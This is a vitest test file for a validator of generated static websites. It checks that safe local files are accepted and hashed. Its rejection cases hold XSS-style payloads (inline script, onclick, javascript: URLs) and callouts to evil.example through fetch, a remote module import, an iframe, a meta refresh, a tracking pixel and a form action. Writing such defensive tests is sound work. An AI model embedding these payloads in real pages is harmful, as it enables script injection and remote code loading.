import { describe, expect, it } from "vitest";
import { validateWebsiteSource } from "@/lib/server/websites/source";

const valid = {
  files: [
    { path: "index.html", content: "<!doctype html><html><head><link rel=\"stylesheet\" href=\"styles.css\"></head><body><h1>Hello</h1><script src=\"script.js\" defer></script></body></html>" },
    { path: "styles.css", content: "body { font-family: sans-serif; }" },
    { path: "script.js", content: "document.querySelector('h1').setAttribute('tabindex', '-1');" },
  ],
};

describe("generated static website policy", () => {
  it("accepts the bounded local static recipe and hashes it deterministically", () => {
    const first = validateWebsiteSource(valid);
    expect(first.files.map((file) => file.path)).toEqual(["index.html", "script.js", "styles.css"]);
    expect(first.sourceSha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it.each([
    ["inline script", "<script>alert(1)</script>"],
    ["iframe", "<iframe src=\"https://evil.example\"></iframe>"],
    ["event handler", "<button onclick=\"alert(1)\">Click</button>"],
    ["javascript URL", "<a href=\"javascript:alert(1)\">Click</a>"],
  ])("rejects %s", (_name, html) => {
    expect(() => validateWebsiteSource({ files: [{ path: "index.html", content: html }, { path: "styles.css", content: "body{}" }] })).toThrow();
  });

  it("rejects network behavior and duplicate paths", () => {
    expect(() => validateWebsiteSource({ files: [...valid.files.slice(0, 2), { path: "script.js", content: "fetch('https://evil.example')" }] })).toThrow();
    expect(() => validateWebsiteSource({ files: [valid.files[0], valid.files[0], valid.files[1]] })).toThrow();
    expect(() => validateWebsiteSource({ files: [...valid.files.slice(0, 2), { path: "script.js", content: "localStorage.setItem('key', 'value')" }] })).toThrow();
    expect(() => validateWebsiteSource({ files: [...valid.files.slice(0, 2), { path: "script.js", content: "import('https://evil.example/module.js')" }] })).toThrow();
  });

  it.each([
    ["meta refresh", "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">"],
    ["spaced remote source", "<img src = \"https://evil.example/pixel.png\" alt=\"\">"],
    ["protocol-relative navigation", "<a href=\"//evil.example\">Leave</a>"],
    ["remote form action", "<form action=\"https://evil.example\"><button>Send</button></form>"],
  ])("rejects %s as defense in depth", (_name, html) => {
    expect(() => validateWebsiteSource({ files: [{ path: "index.html", content: html }, { path: "styles.css", content: "body{}" }] })).toThrow();
  });
});
